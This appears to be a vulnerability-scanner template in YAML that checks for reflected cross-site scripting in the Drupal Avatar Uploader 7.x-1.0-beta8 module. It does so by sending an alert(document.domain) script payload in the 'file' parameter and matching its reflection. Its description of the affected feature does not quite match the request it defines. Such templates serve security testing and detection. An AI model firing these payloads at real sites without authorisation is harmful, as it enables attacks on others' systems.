id: drupal-avatar-xss
name: Drupal Avatar Uploader - Cross-Site Scripting
severity: high
confidence: tentative
description: Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import
  search feature and tab parameter via plugin settings.
reference: CWE-79
tags:
- xss
- drupal
- edb
- packetstorm
- vuln
requests:
- method: GET
  path: /avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - <div><script>alert(document.domain)</script></div>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
